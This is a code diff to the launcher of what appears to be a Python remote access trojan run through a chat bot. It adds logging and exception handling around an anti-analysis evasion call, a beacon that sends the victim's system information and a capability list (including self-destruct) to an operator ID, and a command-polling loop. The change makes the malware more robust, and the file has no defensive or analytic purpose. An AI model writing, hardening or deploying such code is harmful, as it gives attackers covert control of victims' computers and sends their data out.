@@ -4,13 +4,21 @@ import logging
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
-from modules.main import bot, ADMIN_ID, sysinfo, main_kb
-from modules.anti import anti_analysis
-
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 log = logging.getLogger("rat")
 
+try:
+    from modules.main import bot, ADMIN_ID, sysinfo, main_kb
+    from modules.anti import anti_analysis
+except Exception as e:
+    log.error("import failed: %s", e)
+    raise
+
 if __name__ == "__main__":
-    anti_analysis()
+    try:
+        anti_analysis()
+    except Exception as e:
+        log.warning("anti_analysis failed: %s", e)
     try:
         info = sysinfo()
         caps = (
@@ -30,6 +38,8 @@ if __name__ == "__main__":
             "- Self-destruct"
         )
         bot.send_message(ADMIN_ID, f"online\n{info}\n\n{caps}", reply_markup=main_kb())
+        log.info("startup message sent to %s", ADMIN_ID)
     except Exception as e:
         log.warning("startup message failed: %s", e)
+    log.info("polling started")
     bot.infinity_polling(timeout=90, long_polling_timeout=90, interval=7)
